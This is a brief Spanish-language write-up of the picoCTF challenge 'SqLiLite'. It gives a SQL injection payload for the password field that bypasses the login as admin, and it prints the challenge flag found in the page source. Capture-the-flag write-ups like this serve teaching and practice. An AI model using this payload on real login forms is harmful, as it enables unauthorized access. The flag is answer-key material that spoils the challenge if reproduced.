# Reto: SqLiLite

## Descripción

Can you login to this website?

## Solución

Era una simple inyección de código SQL para pasar como admin.
```sql
-- En el campo 'password'
' OR 1; --
```

Después, la flag estaba escondida en el código fuente.

`picoCTF{L00k5_l1k3_y0u_solv3d_it_ec8a64c7}`
